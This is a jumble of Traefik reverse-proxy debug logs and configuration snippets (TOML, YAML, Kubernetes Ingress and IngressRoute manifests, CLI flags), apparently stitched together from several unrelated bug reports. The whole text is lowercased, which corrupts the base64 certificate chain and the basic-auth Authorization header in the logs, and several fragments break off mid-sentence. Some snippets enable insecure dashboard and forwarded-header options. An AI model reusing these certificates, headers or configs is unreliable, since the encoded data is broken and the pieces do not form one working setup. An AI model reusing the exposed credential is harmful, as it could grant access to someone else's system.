time="2019-10-21t09:07:03z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/entrypoints\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"application/json, text/plain, */*\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"fr,en-us;q=0.7,en;q=0.3\\"],\\"authorization\\":[\\"basic y2fpbgxldhi6ckfnzte1bufjaa==\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64; rv:69.0) gecko/20100101 firefox/69.0\\"],\\"x-forwarded-host\\":[\\"traefik-test-infra.blabla.fr\\"],\\"x-forwarded-port\\":[\\"443\\"],\\"x-forwarded-proto\\":[\\"https\\"],\\"x-forwarded-server\\":[\\"traefik-5c85c4c558-64lhf\\"],\\"x-real-ip\\":[\\"x.x.x.x\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"traefik-test-infra.blabla.fr\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"x.x.x.x:60332\\",\\"requesturi\\":\\"/api/entrypoints\\",\\"tls\\":null}"
time="2019-10-21t09:07:03z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/entrypoints\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"application/json, text/plain, */*\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"fr,en-us;q=0.7,en;q=0.3\\"],\\"authorization\\":[\\"basic y2fpbgxldhi6ckfnzte1bufjaa==\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64; rv:69.0) gecko/20100101 firefox/69.0\\"],\\"x-forwarded-host\\":[\\"traefik-test-infra.blabla.fr\\"],\\"x-forwarded-port\\":[\\"443\\"],\\"x-forwarded-proto\\":[\\"https\\"],\\"x-forwarded-server\\":[\\"traefik-5c85c4c558-64lhf\\"],\\"x-real-ip\\":[\\"x.x.x.x\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"traefik-test-infra.blabla.fr\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"x.x.x.x:60332\\",\\"requesturi\\":\\"/api/entrypoints\\",\\"tls\\":null}" forwardurl=" "
time="2019-10-21t09:07:03z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/entrypoints\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"application/json, text/plain, */*\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"fr,en-us;q=0.7,en;q=0.3\\"],\\"authorization\\":[\\"basic y2fpbgxldhi6ckfnzte1bufjaa==\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64; rv:69.0) gecko/20100101 firefox/69.0\\"],\\"x-forwarded-host\\":[\\"traefik-test-infra.blabla.fr\\"],\\"x-forwarded-port\\":[\\"443\\"],\\"x-forwarded-proto\\":[\\"https\\"],\\"x-forwarded-server\\":[\\"traefik-5c85c4c558-64lhf\\"],\\"x-real-ip\\":[\\"x.x.x.x\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"traefik-test-infra.blabla.fr\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"x.x.x.x:60332\\",\\"requesturi\\":\\"/api/entrypoints\\",\\"tls\\":null}"
{"clientaddr":"x.x.x.x:60332","clienthost":"x.x.x.x","clientport":"60332","clientusername":"-","downstreamcontentsize":484,"downstreamstatus":200,"duration":71545395,"origincontentsize":484,"originduration":71485128,"originstatus":200,"overhead":60267,"requestaddr":"traefik-test-infra.blabla.fr","requestcontentsize":0,"requestcount":1,"requesthost":"traefik-test-infra.blabla.fr","requestmethod":"get","requestpath":"/api/entrypoints","requestport":"-","requestprotocol":"http/2.0","retryattempts":0,"routername":"traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd","serviceaddr":"10.42.2.63:8080","servicename":"traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd","serviceurl":{"scheme":"http","opaque":"","user":null,"host":"10.42.2.63:8080","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"startlocal":"2019-10-21t09:07:03.269611735z","startutc":"2019-10-21t09:07:03.269611735z","entrypointname":"webs","level":"info","msg":"","time":"2019-10-21t09:07:03z"}
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" entrypointname=web servicename=traefik-traefik-ui-http-52b87130052d50bba54a middlewarename=pipelining middlewaretype=pipelining routername=traefik-traefik-ui-http-52b87130052d50bba54a@kubernetescrd
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" middlewarename=metrics-service middlewaretype=metrics routername=traefik-traefik-ui-http-52b87130052d50bba54a@kubernetescrd entrypointname=web servicename=traefik-traefik-ui-http-52b87130052d50bba54a
time="2019-10-21t09:07:03z" level=debug msg="creating load-balancer" routername=traefik-traefik-ui-http-52b87130052d50bba54a@kubernetescrd entrypointname=web servicename=traefik-traefik-ui-http-52b87130052d50bba54a
time="2019-10-21t09:07:03z" level=debug msg="creating server 0 " servername=0 routername=traefik-traefik-ui-http-52b87130052d50bba54a@kubernetescrd entrypointname=web servicename=traefik-traefik-ui-http-52b87130052d50bba54a
time="2019-10-21t09:07:03z" level=debug msg="creating server 1 " servicename=traefik-traefik-ui-http-52b87130052d50bba54a servername=1 routername=traefik-traefik-ui-http-52b87130052d50bba54a@kubernetescrd entrypointname=web
time="2019-10-21t09:07:03z" level=debug msg="added outgoing tracing middleware traefik-traefik-ui-http-52b87130052d50bba54a" middlewaretype=tracingforwarder entrypointname=web routername=traefik-traefik-ui-http-52b87130052d50bba54a@kubernetescrd middlewarename=tracing
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" entrypointname=web routername=traefik-traefik-ui-http-52b87130052d50bba54a@kubernetescrd middlewarename=traefik-redirect-https@kubernetescrd middlewaretype=redirectscheme
time="2019-10-21t09:07:03z" level=debug msg="setting up redirection to https " entrypointname=web routername=traefik-traefik-ui-http-52b87130052d50bba54a@kubernetescrd middlewarename=traefik-redirect-https@kubernetescrd middlewaretype=redirectscheme
time="2019-10-21t09:07:03z" level=debug msg="adding tracing to middleware" entrypointname=web routername=traefik-traefik-ui-http-52b87130052d50bba54a@kubernetescrd middlewarename=traefik-redirect-https@kubernetescrd
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" middlewarename=traefik-internal-recovery middlewaretype=recovery entrypointname=web
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" middlewarename=pipelining entrypointname=webs routername=traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd servicename=traefik-traefik-ui-52b87130052d50bba54a middlewaretype=pipelining
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" servicename=traefik-traefik-ui-52b87130052d50bba54a middlewarename=metrics-service middlewaretype=metrics entrypointname=webs routername=traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd
time="2019-10-21t09:07:03z" level=debug msg="creating load-balancer" entrypointname=webs routername=traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd servicename=traefik-traefik-ui-52b87130052d50bba54a
time="2019-10-21t09:07:03z" level=debug msg="creating server 0 " entrypointname=webs routername=traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd servicename=traefik-traefik-ui-52b87130052d50bba54a servername=0
time="2019-10-21t09:07:03z" level=debug msg="creating server 1 " entrypointname=webs routername=traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd servicename=traefik-traefik-ui-52b87130052d50bba54a servername=1
time="2019-10-21t09:07:03z" level=debug msg="added outgoing tracing middleware traefik-traefik-ui-52b87130052d50bba54a" middlewarename=tracing middlewaretype=tracingforwarder routername=traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd entrypointname=webs
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" routername=traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd middlewarename=traefik-blabla-dc-auth@kubernetescrd middlewaretype=forwardedauthtype entrypointname=webs
time="2019-10-21t09:07:03z" level=debug msg="adding tracing to middleware" entrypointname=webs routername=traefik-traefik-ui-52b87130052d50bba54a@kubernetescrd middlewarename=traefik-blabla-dc-auth@kubernetescrd
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" entrypointname=webs middlewarename=traefik-internal-recovery middlewaretype=recovery
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" middlewarename=traefik-internal-recovery middlewaretype=recovery entrypointname=web
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" middlewarename=metrics-entrypoint middlewaretype=metrics entrypointname=web
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" middlewaretype=metrics entrypointname=web middlewarename=metrics-entrypoint
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" entrypointname=webs middlewaretype=metrics middlewarename=metrics-entrypoint
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" entrypointname=webs middlewarename=metrics-entrypoint middlewaretype=metrics
time="2019-10-21t09:07:03z" level=debug msg="creating middleware" entrypointname=traefik middlewaretype=metrics middlewarename=metrics-entrypoint
time="2019-10-21t09:07:03z" level=debug msg="skipping kubernetes event kind *v1.endpoints" providername=kubernetes
time="2019-10-21t09:07:03z" level=debug msg="skipping kubernetes event kind *v1.endpoints" providername=kubernetescrd
time="2019-10-21t09:07:04z" level=debug msg="no store is defined to add the certificate -----begin certificate-----\ \ miiikjccbxkgawibagiqbbcxbyc02c+so69ve2x7pjanbgkqhkig9w0baqsfadbk\ \ mqswcqydvqqgewjotdewmbqga1uecbmntm9vcmqtsg9sbgfuzdesmbaga1uebxmj\ \ qw1zdgvyzgftmq8wdqydvqqkewzurvjftkexgdawbgnvbamtd1rfukvoqsbtu0wg\ \ q0egmzaefw \ \ akzsmr4whaydvqqhdbvtywludc1nyxj0aw4grcdiw6hyzxmxizahbgnvbaomglvu\ \ axzlcnnpdmopiedyzw5vymxliefscgvzmq0wcwydvqqlewrpu1vhmriweaydvqqd\ \ dakqlm9zdwcuzniwggiima0gcsqgsib3dqebaquaa4icdwawggikaoicaqdnb3om\ \ ad3mhb94ynr6c//wdfzzdobaq9rvvswd/txtygnawm5k3fy2as+jawjn38zb4fbx\ \ sehdypwq/wvuuwr3vjayeixw4zi2ptys++nbxiadfqybc7hietrrxrorubaxy/os\ \ vgxy6n2ykvueid9wmy1jcek5jnxwgf2+ezvhuucngwk9gclz9xvfrpywxzzr/tyi\ \ 0vtg8ku8ap+vyjb+dghn6opk3avdsu8z+23dcmslw2yzhimyal7ha4yc9sccay5d\ \ maxnr8pit5zsbpzx4/5htvdcrgpgfivckzwtibldu7k7uy6vzhmamn/2y7g1q0y8\ \ ckllptbvzoritlc+3qqh865f/uez3dcshyy91d1egc1k5f+zdxv7jmofkgiywg7m\ \ nwhdz64tajsomrnaxzctn971h3gvmiqfgmuezlu6acd1hd6ojezcjri2sq1ytgti\ \ 84+f7+la59/9dba6+1bt3ofcqspyc0af23owvjwgjsiednnr53sw0m+q99vxfeev\ \ qmss1sazjcfsoq0u2y6mbumwtcujs11oj2avqps+nkv2qjakxgdb8nwfht1qyhln\ \ na05hxajjyayqsowtkafsv9czpnlasx0frbosufmb6ep9qfsowj1qthdgk2hf+ao\ \ h7sdzzt2ppjopf6sxx5ut5qzws6xjppencjcfwidaqabo4idxtcca8ewhwydvr0j\ \ bbgwfoauz/2iibqnmmcj0iuzu+lrewn1ugiwhqydvr0obbyefh1+nh3xcbw4f/ls\ \ drp1ul+lz+dzmb0ga1udeqqwmbsccsoub3n1zy5mcoihb3n1zy5mcjaobgnvhq8b\ \ af8ebamcbaawhqydvr0lbbywfayikwybbquhawegccsgaqufbwmcmgsga1udhwrk\ \ mgiwl6atocugkwh0dha6ly9jcmwzlmrpz2ljzxj0lmnvbs9urvjftkftu \ \ y3jsmc+glaarhilodhrwoi8vy3jsnc5kawdpy2vydc5jb20vvevsru5bu1nmq0ez\ \ lmnybdbmbgnvhsaertbdmdcgcwcgsagg/wwbataqmcggccsgaqufbwibfhxodhrw\ \ czovl3d3dy5kawdpy2vydc5jb20vq1btmaggbmebdaecajbubggrbgefbqcbaqri\ \ mgawjayikwybbquhmaggggh0dha6ly9vy3nwlmrpz2ljzxj0lmnvbta4bggrbgef\ \ bqcwaoysahr0cdovl2nhy2vydhmuzglnawnlcnquy29tl1rfukvoqvnttenbmy5j\ \ cnqwdaydvr0taqh/baiwadccafygcisgaqqb1nkcbaiegghmbiib4ghgahyaplkj\ \ klqywbshuxoizgdwcjw1mat5g9+443fndsgn3baaaaflnhstxqaabamarzbfaiap\ \ v6qibhma/s1+anfctdciog7xkx3dkbri0utgtjfacwihaobsdrdajhuoppljnnti\ \ ua3tlfnurhvolrdtwluksx/rahyah3w/51l8+ixdmv+9827/vo1hvjb/srvgwbtq\ \ /16ggw8aaaflnhsuawaabamarzbfaieascu+jgnvn5izyxasvhmghouaihiq1lu0\ \ kawmm1msu88ciadtbg4n/icj2buk9+o/w8dgarshkbpl8vndcgwnt8noahyau9nf\ \ vb+kcbwtlcoxqpj7rzhxlqqruugakjzkno4e0yuaaaflnhsumwaabamarzbfaiea\ \ rcctzjyuo0z4cnofqytl76hduej8iiivvfaxqs4c6tscifb16xxnzahv4emb2eue\ \ udehyqcd0o0fc3ypjfihdt3dahyab1n2rdhwmrnymqckurx/dxucedkcwqapbo2y\ \ cjo32rmaaaflnhsvagaabamarzbfaiealstvudzkuqnv4gmci10wyyzfobxklbuh\ \ y45ym/zp4/ccigz0gft85rgxsgr1kucfqbkvr7/0yhwuznsjnllixgmtma0gcsqg\ \ sib3dqebcwuaa4ibaqcpnxq6aeii8gfgyhvm4brucj+f5r5ej4rjyywbhzgpluwi\ \ deciydzhx4jvueqyydhzkvurgreyq/kwqompeww/2wir/1oluyza56fj7kvjjozj\ \ bjdqv/+3xx/y1zxjaeap/ljqna365eamubqcx9pfkkg5kciafxgfbbin9ltkndlz\ \ wfyohjx/3wday5irkbmp0pea3+lohjxd1ajb3u4zireaz2dag9cz8plc7t7kfrvf\ \ l4yjnri/zxpg5susgfs1zcxz0slbfhwxm3xf4yobvriu5qwwqlnr70fgzg6h30qs\ \ hshwuqg1erq//u01f0mxydzo4ssnttl4zcn0wmas\ \ -----end certificate-----\ \ -----begin certificate-----\ \ miie+zcca+ogawibagiqchc8xa8/25wakctq7u/kztanbgkqhkig9w0baqsfadbl\ \ mqswcqydvqqgewjvuzevmbmga1uechmmrglnaunlcnqgsw5jmrkwfwydvqqlexb3\ \ d3cuzglnawnlcnquy29tmsqwigydvqqdexteawdpq2vydcbbc3n1cmvkieleifjv\ \ b3qgq0ewhhcnmtqxmte4mtiwmdawwhcnmjqxmte4mtiwmdawwjbkmqswcqydvqqg\ \ ewjotdewmbqga1uecbmntm9vcmqtsg9sbgfuzdesmbaga1uebxmjqw1zdgvyzgft\ \ mq8wdqydvqqkewzurvjftkexgdawbgnvbamtd1rfukvoqsbtu0wgq0egmzccasiw\ \ dqyjkozihvcnaqebbqadggepadccaqocggebamv2dw/zqyk7bg3rr63eel8jwnio\ \ snc18snb4eweqefcmqc9iddfdd25ahcaho/tzcmeraegotubtc9jp8jj/ykeilds\ \ lrlcinqfkioq8hlit2hutvhbgubobhpphsn7tu08d08/qjybzqjmxjx/zjj1dd10\ \ vawgnheeeirvy++udy538rv27tokwuuhn6i+0sftcuiromo/h9ha8y+5cx9e5+ct\ \ 85xcfk3shkm6kttpxn3mvcsaqe+zvlhzj28nhuo+sanw5ae8jafohbbbv1brxbz8\ \ mgxrzuyvkzs/ryvj+g1shxwcvgenfqtylvrx5gg1ikd6jmlqcvgrn223zyucawea\ \ aaocaaywgggimbiga1udeweb/wqimaybaf8caqawdgydvr0paqh/baqdagggmhkg\ \ ccsgaqufbwebbg0wazakbggrbgefbqcwayyyahr0cdovl29jc3auzglnawnlcnqu\ \ y29tmemgccsgaqufbzachjdodhrwoi8vy2fjzxj0cy5kawdpy2vydc5jb20vrgln\ \ aunlcnrbc3n1cmvksursb290q0euy3j0migbbgnvhr8eejb4mdqgoka2hjrodhrw\ \ oi8vy3jsmy5kawdpy2vydc5jb20vrglnaunlcnrbc3n1cmvksursb290q0euy3js\ \ mdqgoka2hjrodhrwoi8vy3jsnc5kawdpy2vydc5jb20vrglnaunlcnrbc3n1cmvk\ \ sursb290q0euy3jsmd0ga1udiaq2mdqwmgyevr0gadaqmcggccsgaqufbwibfhxo\ \ dhrwczovl3d3dy5kawdpy2vydc5jb20vq1btmb0ga1uddgqwbbrn/yggfceyxwns\ \ jrm76very3vqyjafbgnvhsmegdawgbrf66kv9jllgjetuyunpygd823idzanbgkq\ \ hkig9w0baqsfaaocaqeaqsg1esr71tonhqyyzyc2txeydhtmqn0dzfjodzwvs4xd\ \ xgs/ffqjz4u5b5ce60adws3j0asugs7jurhognacytnbvnzzbjx946nw09e02dxj\ \ wysamm6/xvlymdx/6w9dok867mztrqqmaci+mqege9icszmtyafzd9fzzm2ey/lc\ \ j1ouedojcjcv8b73hjwizsmt8tey5gvhacdlh198azt+ziyam0tduncfo7pdp0gj\ \ +hy77gruw6xws++mcpjke1e9gw6lngduji2gczqfxzer8cm/jyxflp5hcahe3qm5\ \ hs+1ngclxwmgmkmd1l8trnan2v11y18woa5hwna9ng==\ \ -----end certificate-----\ \ -----begin certificate-----\ \ miidtzccap+gawibagiqdofg5rfyrv6p5wd8g/awotanbgkqhkig9w0baqufadbl\ \ mqswcqydvqqgewjvuzevmbmga1uechmmrglnaunlcnqgsw5jmrkwfwydvqqlexb3\ \ d3cuzglnawnlcnquy29tmsqwigydvqqdexteawdpq2vydcbbc3n1cmvkieleifjv\ \ b3qgq0ewhhcnmdyxmtewmdawmdawwhcnmzexmtewmdawmdawwjblmqswcqydvqqg\ \ ewjvuzevmbmga1uechmmrglnaunlcnqgsw5jmrkwfwydvqqlexb3d3cuzglnawnl\ \ cnquy29tmsqwigydvqqdexteawdpq2vydcbbc3n1cmvkieleifjvb3qgq0ewggei\ \ ma0gcsqgsib3dqebaquaa4ibdwawggekaoibaqctdhxo5eoaxlgh87dg+xespa7c\ \ jpsiqvto9sa5kfhgdpia2qkvltjhplwxkiskityfcgydf3qpkkyk53ltxdgekvyp\ \ mdi2dsze3tyoou9q+yhyumhfnydxh+kx2f4yznisw1/5wbg1vefnotb5a3/usdg+\ \ wrvdjdpz2c8y/igps6ed1snurmbhnzyw/lmci3zt1/gisw0r/wty2p5g0i6qncz4\ \ vycgoc/lbqrisxwxmdnsiumh0djaorotghhtoredmtpyoeb6pnnvfzf1rov9iq4/\ \ auag9ih5ylha5fcxxh4cdrc0kqzws72yl+2qp/c3xag/lrbq/6gw6whfghdpagmb\ \ aagjyzbhma4ga1uddweb/wqeawibhjapbgnvhrmbaf8ebtadaqh/mb0ga1uddgqw\ \ bbrf66kv9jllgjetuyunpygd823idzafbgnvhsmegdawgbrf66kv9jllgjetuyun\ \ pygd823idzanbgkqhkig9w0baqufaaocaqeaog683+lt8onyc3pkll/3cmbymurc\ \ dwkuh+vy1dnevrofzm4uklknl2bcekxy5nm9g0lfwjc1arqor+pwxnmrethngytf\ \ fwk8loa4jiwgvt2zkin3x/8i4peeh+ll74fg38fnsbnd67ijkusm7xi+ft8r87cm\ \ nw1fiqg2svufaqwbqz0lwcy2f8lxb4bg+mro64etlotct/qmht1i8b5qz7dsvfpx\ \ h2smngcwfzd8qvttevesrmcd1ycevkvol77dzypoed+a5wwzzr8tdrru838fyxae\ \ +o0bjw1sj6w3yqgx0qmmorbxna3iw/ndmvg3kwcizi7mulkn+gpfl6lw8g==\ \ -----end certificate-----, it will be added to the default store." ```
- args: - --api.insecure - --accesslog - --entrypoints.web.address=:80 - --entrypoints.websecure.address=:443 - --accesslog.fields.headers.defaultmode=:keep - --entrypoints.web.forwardedheaders.insecure - --entrypoints.websecure.forwardedheaders.insecure - --providers.kubernetescrd - --entrypoints.web.forwardedheaders.insecure ```
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: creationtimestamp: "2019-10-08t14:20:39z" generation: 1 name: ingress-pool-1 namespace: prod spec: entrypoints: - websecure routes: - kind: rule match: host(`myweb.com`) && pathprefix(`/api/1`,`/api/2`,`/api/3`) middlewares: - name: default-compress services: - name: prod-pool-main port: 3000 ```
our traefik is run on two centos7 vms with round robin loadbalancing between the two, however when isolating one for testing purposes, the issues still occur.
we use pcs for managing the virtual ips for the vms.
accesslog: {}
entrypoints: tcp: address: :8000 web: address: :80 websecure: address: :443
global: checknewversion: true sendanonymoususage: false
log: level: debug
providers: file: directory: /etc/traefik/config watch: true
tracing: {}
http: routers: {{env}}-http: rule: "hostregexp(`{subdomain:.+}.{{env}}.domain.co.uk`)" entrypoints: ["web"] service: {{env}}-http services: {{env}}-http: loadbalancer: passhostheader: true servers: - url: " {{env_letter}}001.domain.co.uk:30000" - url: " {{env_letter}}002.domain.co.uk:30000" tcp: routers: {{env}}-kubemaster: service: {{env}}-kubemaster rule: "hostsni(`kubemaster.{{env}}.domain.co.uk`)" entrypoints: ["websecure"] tls: passthrough: true {{env}}-https: service: {{env}}-https rule: "hostsni(`*`)" entrypoints: ["websecure"] tls: passthrough: true services: {{env}}-https: loadbalancer: passhostheader: true servers: - address: "long-k8mi-{{env_letter}}001.domain.co.uk:30443" - address: "long-k8mi-{{env_letter}}002.domain.co.uk:30443" {{env}}-kubemaster: loadbalancer: passhostheader: true servers:
{% for j in range(1, number_of_k8_masters) %} - address: "long-k8ma-{{env_letter}}00{{j}}.domain.co.uk:6443"
{% endfor %}
running on a debian 9 vm
#debug = true
loglevel = "info"
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_aes_128_gcm_sha256" ] [entrypoints.traefik] address = ":8080" [entrypoints.traefik.auth.basic] users = ["user:pw"] [traefiklog]
filepath = "/var/log/traefik.log"
format = "json" [accesslog]
filepath = "/var/log/traefik_access.log"
format = "common" #[accesslog.fields]
# [accesslog.fields.names]
# "duration" = "keep" [api]
entrypoint = "traefik"
dashboard = true [api.statistics] recenterrors = 50 [ping] [acme]
email = "email"
storage = "/etc/traefik.d/acme/acme.json"
entrypoint = "https"
acmelogging = true
ondemand = true [acme.httpchallenge]
entrypoint = "http" [file] [backends] [backends.engine-redirect-service] [backends.engine-redirect-service.servers.server1] url = " " weight = 1 [frontends] [frontends.catchall] backend = "engine-redirect-service" passhostheader = true priority = 1 [frontends.catchall.routes.route0] rule = "hostregexp:{catchall:.*}" [frontends.catchall.ratelimit] extractorfunc = "client.ip" [frontends.catchall.ratelimit.rateset.rateset1] period = "60s" average = 30 burst = 60 [frontends.catchall.ratelimit.rateset.rateset2] period = "10m" average = 300 burst = 600
```
i don't think it's relevant
[tls.options] [tls.options.default] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_aes_128_gcm_sha256", "tls_aes_256_gcm_sha384", "tls_chacha20_poly1305_sha256" ] snistrict = true [tls.options.intranet] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_aes_128_gcm_sha256", "tls_aes_256_gcm_sha384", "tls_chacha20_poly1305_sha256" ] snistrict = true [tls.options.intranet.clientauth] cafiles = ["/ca.pem"] clientauthtype = "requireandverifyclientcert" [http.middlewares] [http.middlewares.compress-all.compress] [http.middlewares.https-only.redirectscheme] scheme = "https" permanent = true [http.middlewares.security-headers.headers] browserxssfilter = true contenttypenosniff = true forcestsheader = true framedeny = true sslredirect = true stsincludesubdomains = true stspreload = true stsseconds = 315360000 [http.middlewares.strip-prefix.chain] middlewares = [ "strip-prefix-1", "strip-prefix-2"] [http.middlewares.strip-prefix-1.redirectregex] regex="^(https?://[^/]+/[a-z0-9_]+)$" replacement="${1}/" permanent = true [http.middlewares.strip-prefix-2.stripprefixregex] regex = [ "/[a-z0-9_]+" ] ``` ``` - --global.checknewversion=false - --global.sendanonymoususage=false - --accesslog - --api - --api.insecure - --ping - --certificatesresolvers.default.acme.httpchallenge.entrypoint=http - --certificatesresolvers.default.acme.email=support@trajano.net - --certificatesresolvers.default.acme.storage=/etc/traefik/acme/default.json - --entrypoints.http.address=:80 - --entrypoints.https.address=:443 - --providers.docker.endpoint=tcp://daemon:2375 - --providers.docker.exposedbydefault=false - --providers.docker.swarmmode=true - "--providers.docker.constraints=!label(`intranet`, `true`)" - \'--providers.docker.defaultrule=host(`trajano.net`) && pathprefix(`/{{ .name | trimprefix (index .labels "com.docker.stack.namespace") | trimprefix "_" | trimprefix "-" }}`)\' - --providers.file.filename=/traefik-conf.toml - --tracing.zipkin.httpendpoint=
################################################################
# ecs provider
################################################################ watch = true
loglevel = "debug"
defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.ping] address = ":8082" [ping]
entrypoint = "ping" [accesslog] format = "json" [accesslog.fields.headers] defaultmode = "drop" [accesslog.fields.headers.names] "accept" = "keep" "accept-encoding" = "keep" "accept-language" = "keep" "referer" = "keep" "user-agent" = "keep" "cache-control" = "keep" "content-encoding" = "keep" "content-type" = "keep" "x-trace-id" = "keep" [traefiklog] format = "json" [ecs] clusters = ["default"] autodiscoverclusters = true refreshseconds = 15 exposedbydefault = false
```toml [log] level = "info" format = "json" [accesslog] format = "json" [entrypoints.http] address = ":80" [entrypoints.http-internal] address = ":81" [entrypoints.https] address = ":443" [entrypoints.traefik] address = ":8080" [entrypoints.traefik-ext] address = ":8081" [providers.kubernetesingress] ingressclass = "traefik" [providers.kubernetescrd] [providers.file] directory = "/config/static" watch = true [api] insecure = true dashboard = true debug = true [metrics.prometheus] entrypoint = "traefik" buckets = [0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1.0,1.5,2.0]
```toml [log] level = "info" format = "json" [accesslog] format = "json" [entrypoints.http] address = ":80" [entrypoints.http-internal] address = ":81" [entrypoints.https] address = ":443" [entrypoints.traefik] address = ":8080" [entrypoints.traefik-ext] address = ":8081" [providers.kubernetesingress] ingressclass = "traefik" [providers.kubernetescrd] [providers.file] directory = "/config/static" watch = true [api] insecure = true dashboard = true debug = true [metrics.prometheus] entrypoint = "traefik" buckets = [0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1.0,1.5,2.0]
``` ingress kubernetes: ```
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: kubernetes.io/ingress.class: traefik creationtimestamp: "2019-07-31t14:42:45z" generation: 2 labels: app: pwet release: pwet name: pwet namespace: pwet resourceversion: "90246831" selflink: /apis/extensions/v1beta1/namespaces/pwet/ingresses/pwet uid: 7553afb4-b3a1-11e9-a70e-000d3a482661
spec: rules: - host: pwet.com http: paths: - backend: servicename: pwet serviceport: 8080 path: / - backend: servicename: pwet serviceport: 8080 path: /api/v1/ tls: - hosts: - pwet.com secretname: pwet-tls
status: loadbalancer: {}
traefik.toml
[global] checknewversion = true sendanonymoususage = true [entrypoints] [entrypoints.web] address = ":80" [entrypoints.websecure] address = ":443" [log] level = "debug" [ping] [api] insecure = true [providers] [providers.docker] [providers.file] watch = true filename = "dynamic_conf.toml"
``` dynamic_conf.toml
# http routing section
[http] [http.routers] # define a connection between requests and services [http.routers.to-web] rule = "host(`localhost`)" middlewares = ["test-auth"] service = "myweb" [http.middlewares] [http.middlewares.test-auth.forwardauth] address = " " [http.middlewares.test-auth.forwardauth.tls] ca = "/etc/vault/tls/ca.pem" caoptional = true [http.services] # define how to reach an existing service on our infrastructure [http.services.myweb.loadbalancer] [[http.services.myweb.loadbalancer.servers]] url = " "
this update fixes the broken "dns-01 acme/ovh/arm7" setup
defaultentrypoints = ["http"]
allowminweightzero = true
[respondingtimeouts]
idletimeout = "15s"
debug = true
[entrypoints] [entrypoints.http] address = ":xx" [entrypoints.traefik] address = ":xxxx" [accesslog] filepath = "/log/access.log" [api] dashboard = true entrypoint = "traefik" debug = true ``` ### my investigation please see the function here
